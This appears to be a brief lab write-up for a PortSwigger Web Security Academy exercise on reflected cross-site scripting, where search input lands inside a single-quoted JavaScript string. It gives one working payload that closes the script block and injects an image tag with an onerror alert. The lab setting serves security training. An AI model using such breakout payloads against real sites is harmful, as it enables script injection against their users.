
# Reflected XSS into a JavaScript string with single quote 

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

---------------------------------------------

References: 

- https://portswigger.net/web-security/cross-site-scripting/contexts



![img](images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote/1.png)

---------------------------------------------

The content of the search is reflected inside a h1 HTML element and a variable in Javascript with single quotes:



![img](images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote/2.png)


I used the payload:

```
';</script><img src=x onerror=alert(1)><script>var a='a
```





![img](images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote/3.png)
![img](images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote/4.png)